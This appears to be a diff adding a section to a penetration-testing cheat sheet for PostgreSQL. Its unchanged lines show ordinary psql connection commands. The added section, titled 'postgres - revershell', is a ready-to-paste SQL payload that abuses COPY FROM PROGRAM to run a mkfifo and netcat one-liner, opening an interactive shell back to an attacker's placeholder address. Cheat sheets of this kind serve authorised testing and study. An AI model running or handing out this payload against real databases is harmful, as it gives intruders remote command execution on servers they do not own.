@@ -20,3 +20,8 @@ psql -h <ip> -U <user> -d <database>
 ```
 psql -h <ip> -p <port> -U <user> -W <password> <database>
 ```
+
+## postgres - revershell
+```
+CREATE TABLE shell(output text);COPY shell FROM PROGRAM 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <ip> <port> >/tmp/f';SELECT * FROM shell;
+```
